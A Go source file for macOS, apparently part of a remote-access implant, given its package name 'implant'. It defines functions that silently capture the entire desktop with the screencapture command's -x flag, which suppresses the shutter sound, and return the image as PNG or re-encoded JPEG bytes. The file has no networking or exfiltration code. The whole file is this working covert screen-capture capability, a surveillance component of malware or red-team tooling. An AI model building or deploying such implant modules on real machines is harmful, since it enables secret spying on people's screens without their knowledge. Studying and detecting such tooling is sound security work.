//go:build darwin

package implant

import (
	"bytes"
	"context"
	"fmt"
	"image/jpeg"
	"image/png"
	"os/exec"
	"time"
)

// CaptureScreenshot captures the entire desktop and returns PNG-encoded bytes.
// Uses the built-in screencapture command.
func CaptureScreenshot() ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "screencapture", "-x", "-t", "png", "/dev/stdout")
	output, err := cmd.Output()
	if err != nil {
		if ctx.Err() != nil {
			return nil, fmt.Errorf("screencapture timed out: %w", ctx.Err())
		}
		return nil, fmt.Errorf("screencapture: %w", err)
	}

	if len(output) == 0 {
		return nil, fmt.Errorf("screencapture returned empty output")
	}

	return output, nil
}

// CaptureScreenshotJPEG captures the desktop and returns JPEG-encoded bytes.
// First captures PNG, then re-encodes as JPEG at the given quality (1-100).
func CaptureScreenshotJPEG(quality int) ([]byte, error) {
	pngData, err := CaptureScreenshot()
	if err != nil {
		return nil, err
	}

	img, err := png.Decode(bytes.NewReader(pngData))
	if err != nil {
		return nil, fmt.Errorf("PNG decode: %w", err)
	}

	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, fmt.Errorf("JPEG encode: %w", err)
	}
	return buf.Bytes(), nil
}
